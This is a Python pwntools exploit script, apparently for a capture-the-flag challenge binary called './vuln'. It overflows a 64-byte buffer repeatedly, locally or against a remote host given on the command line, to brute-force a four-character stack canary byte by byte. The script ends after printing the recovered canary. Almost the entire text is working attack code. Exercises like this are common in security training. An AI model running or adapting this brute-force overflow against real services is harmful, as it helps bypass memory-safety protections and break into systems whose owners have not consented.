from pwn import *
from tqdm import tqdm
# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

BUF_SIZE = 64
FLAG_SIZE = 64
CANARY_SIZE = 4

FILLER_LEN = BUF_SIZE + CANARY_SIZE


def brute_force_canary():
    canary = b""
    for i in range(CANARY_SIZE):
        progress = tqdm(string.ascii_letters + string.digits, desc="Bruteforcing character %i" % (i + 1))
        for c in progress:
            c = str.encode(c)
            with context.local(log_level='ERROR'):
                try:
                    io = start()
                    io.sendlineafter(b"How Many Bytes will You Write Into the Buffer?\n> ", str.encode(str(BUF_SIZE + len(canary) + 1)))
                    io.sendlineafter(b"Input> ", fit({BUF_SIZE: canary + c}))
                    response = io.recvline()
                    if b"Stack Smashing Detected" in response:
                        continue
                    canary += c
                    progress.write("Found character %i of canary: %s" % (i, c))
                    break
                finally:
                    io.close()
        else:
            raise Exception("Can't find canary")
    return canary


canary = brute_force_canary()
log.info("Canary: {}".format(canary))
